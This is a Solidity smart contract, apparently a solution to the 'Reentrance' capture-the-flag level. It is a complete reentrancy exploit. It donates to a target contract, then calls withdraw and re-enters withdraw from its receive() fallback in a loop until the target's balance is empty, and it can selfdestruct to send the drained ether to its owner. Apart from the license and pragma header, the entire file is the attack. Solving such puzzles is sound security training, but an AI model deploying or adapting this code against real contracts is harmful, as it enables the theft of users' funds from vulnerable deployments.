// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentranceSolution {
  address reentranceAddress;
  address payable owner;

  constructor(address _reentranceAddress) payable {
    reentranceAddress = _reentranceAddress;
    owner = payable(msg.sender);
  }

  function callDonate() external {
    uint256 ethAmount = 0.0001 ether;
    bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
    (bool success,) = reentranceAddress.call{value: ethAmount}(payload);
    require(success, "Failed to call donate.");
  }

  function callWithdraw() external {
    uint256 ethAmount = 0.0001 ether;
    bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", ethAmount);
    (bool success,) = reentranceAddress.call(payload);
    require(success, "Failed to call withdraw.");
  }

  function destroyMe() external {
    require(msg.sender == owner, "you are not the owner");
    selfdestruct(owner);
  }

  receive() external payable {
    uint256 ethAmount = 0.0001 ether;
    while (reentranceAddress.balance > 0) {
      bytes memory withdrawPayload = abi.encodeWithSignature("withdraw(uint256)", ethAmount);
      (bool success,) = reentranceAddress.call(withdrawPayload);
    }
  }
}
